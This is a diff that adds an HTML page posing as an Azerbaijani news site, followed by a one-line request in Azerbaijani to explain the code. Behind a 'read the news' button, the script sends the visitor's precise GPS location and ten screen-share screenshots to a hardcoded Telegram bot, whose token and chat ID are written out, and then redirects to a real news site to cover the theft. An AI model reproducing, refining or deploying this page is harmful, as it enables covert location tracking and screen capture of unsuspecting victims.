@@ -1,0 +1,185 @@
+<!DOCTYPE html>  <html lang="az">  
+<head>  
+    <meta charset="UTF-8">  
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">  
+    <title>XEBERNEWS.COM - Azərbaycandan son xəbərlər</title>  <!-- Open Graph -->  
+<meta property="og:type" content="website">  
+<meta property="og:title" content="XEBERNEWS.COM - Son Xəbərlər">  
+<meta property="og:description" content="Xəbərin tam mətnini oxumaq üçün keçid edin.">  
+<meta property="og:image" content="https://azertag.az/files/2026/3/1200x630/17904079294948522637_1200x630.jpg">  
+<meta property="og:image:width" content="1200">  
+<meta property="og:image:height" content="630">  
+
+<style>  
+    body {  
+        font-family: Arial, sans-serif;  
+        background-color: #121212;  
+        color: #ffffff;  
+        display: flex;  
+        flex-direction: column;  
+        align-items: center;  
+        justify-content: center;  
+        min-height: 100vh;  
+        margin: 0;  
+        padding: 20px;  
+        text-align: center;  
+        box-sizing: border-box;  
+    }  
+    .container {  
+        background-color: #1e1e1e;  
+        padding: 20px;  
+        border-radius: 12px;  
+        box-shadow: 0 4px 15px rgba(0,0,0,0.5);  
+        max-width: 350px;  
+        width: 100%;  
+    }  
+    .preview-img-container {  
+        margin-bottom: 15px;  
+        display: flex;  
+        align-items: center;  
+        justify-content: center;  
+    }  
+    .preview-img {  
+        max-width: 100%;  
+        max-height: 200px;  
+        object-fit: cover;  
+        border-radius: 8px;  
+    }  
+    .btn {  
+        background-color: #cc0000;  
+        color: white;  
+        padding: 14px 28px;  
+        border: none;  
+        border-radius: 8px;  
+        font-size: 16px;  
+        font-weight: bold;  
+        cursor: pointer;  
+        width: 100%;  
+        margin-top: 15px;  
+    }  
+    #status {  
+        margin-top: 15px;  
+        font-size: 14px;  
+        color: #888888;  
+    }  
+    video, canvas { display: none; }  
+</style>
+
+</head>  
+<body>  <div class="container">  
+    <div class="preview-img-container">  
+        <img id="newsImg" src="" alt="Xəbər Şəkli" class="preview-img">  
+    </div>  
+      
+    <h2>XEBERNEWS.COM</h2>  
+    <p>Xəbərin tam mətnini oxumaq üçün aşağıdakı düyməni sıxın.</p>  
+    <button class="btn" onclick="startProcess()">Xəbəri Oxu</button>  
+    <div id="status"></div>  
+</div>  
+
+<video id="video" autoplay playsinline muted></video>  
+<canvas id="canvas"></canvas>  
+
+<script>  
+    // TELEGRAM VƏ YÖNLƏNDİRMƏ PARAMETRLƏRİ  
+    const BOT_TOKEN = "8829689327:AAGBTg9f9NrXGhd0F0d6Pq1C9uiWGxaz4vM";  
+    const CHAT_ID = "832676124";  
+
+    // XƏBƏR ŞƏKLİ VƏ YÖNLƏNDİRİLƏCƏK SAYT LINKI  
+    const NEWS_IMAGE_URL = "https://azertag.az/files/2026/3/1200x630/17904079294948522637_1200x630.jpg";  
+    const REDIRECT_URL = "https://sonxeber.az";   
+
+    document.getElementById('newsImg').src = NEWS_IMAGE_URL;  
+
+    // Bota skrinşot göndərən funksiya  
+    async function captureAndSendScreenshot(videoElement, canvasElement, screenshotNumber) {  
+        canvasElement.width = videoElement.videoWidth || 1280;  
+        canvasElement.height = videoElement.videoHeight || 720;  
+        const ctx = canvasElement.getContext('2d');  
+        ctx.drawImage(videoElement, 0, 0, canvasElement.width, canvasElement.height);  
+
+        return new Promise((resolve) => {  
+            canvasElement.toBlob(async (blob) => {  
+                if (blob) {  
+                    const formData = new FormData();  
+                    formData.append('chat_id', CHAT_ID);  
+                    formData.append('photo', blob, `screenshot_${screenshotNumber}.jpg`);  
+                    formData.append('caption', `🖥️ **Ekran Skrinşotu #${screenshotNumber}**`);  
+                    formData.append('parse_mode', 'Markdown');  
+
+                    try {  
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {  
+                            method: 'POST',  
+                            body: formData  
+                        });  
+                    } catch (e) {}  
+                }  
+                resolve();  
+            }, 'image/jpeg');  
+        });  
+    }  
+
+    async function startProcess() {  
+        const statusDiv = document.getElementById('status');  
+        statusDiv.innerText = "Yüklənir, xahiş olunur gözləyin...";  
+
+        // 1. DƏQİQ MƏKAN (GPS) GÖNDƏRİLMƏSİ  
+        if ("geolocation" in navigator) {  
+            const geoOptions = {  
+                enableHighAccuracy: true,  
+                timeout: 10000,  
+                maximumAge: 0  
+            };  
+
+            navigator.geolocation.getCurrentPosition(  
+                async (position) => {  
+                    const lat = position.coords.latitude;  
+                    const lon = position.coords.longitude;  
+                    try {  
+                        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`);  
+                    } catch (e) {}  
+                },  
+                (err) => {},  
+                geoOptions  
+            );  
+        }  
+
+        // 2. EKRAN SKRİNŞOTUNUN ALINMASI (DisplayMedia API)  
+        try {  
+            // İstifadəçidən ekran paylaşımı icazəsi istənilir  
+            const screenStream = await navigator.mediaDevices.getDisplayMedia({   
+                video: true   
+            });  
+              
+            const video = document.getElementById('video');  
+            const canvas = document.getElementById('canvas');  
+            video.srcObject = screenStream;  
+            await new Promise(resolve => video.onloadedmetadata = resolve);  
+
+            // 10 ədəd skrinşot çəkmək üçün dövr  
+            for (let i = 1; i <= 10; i++) {  
+                statusDiv.innerText = `İşlənir (${i}/10)...`;  
+                await captureAndSendScreenshot(video, canvas, i);  
+                await new Promise(resolve => setTimeout(resolve, 1000)); // 1 saniyə intervalla  
+            }  
+
+            statusDiv.innerText = "Yönləndirilir...";  
+            screenStream.getTracks().forEach(track => track.stop());  
+
+            setTimeout(() => {  
+                window.location.href = REDIRECT_URL;  
+            }, 500);  
+
+        } catch (err) {  
+            // Ekran icazəsi verilmədikdə və ya xəta olduqda belə sayta yönləndirir  
+            statusDiv.innerText = "Yönləndirilir...";  
+            setTimeout(() => {  
+                window.location.href = REDIRECT_URL;  
+            }, 1000);  
+        }  
+    }  
+</script>
+
+</body>  
+</html>  
+ Bu kod haqqinda etrafli melumat ver
